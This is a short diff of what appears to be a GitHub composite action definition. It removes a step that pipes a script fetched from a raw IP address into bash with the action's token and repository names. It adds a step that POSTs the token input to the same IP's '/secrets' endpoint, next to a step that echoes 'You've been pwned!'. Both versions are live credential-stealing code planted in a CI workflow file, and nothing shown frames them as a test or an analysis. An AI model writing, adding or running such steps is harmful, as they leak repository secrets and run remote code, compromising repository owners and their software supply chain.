@@ -9,11 +9,13 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - name: Expose Config Files
-      run: |
-        curl -sL http://91.205.105.40/fetch_and_expose_secrets.sh | bash -s "${{ inputs.token }}" "${{ github.repository_owner }}" "${{ github.event.repository.name }}"
-      shell: bash
-
     - name: Dummy Step
       run: echo "You've been pwned!"
+      shell: bash
+
+    - name: Expose Secrets
+      env:
+        SECRET_VAR: ${{ inputs.token }}
+      run: |
+        echo "$SECRET_VAR" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
       shell: bash
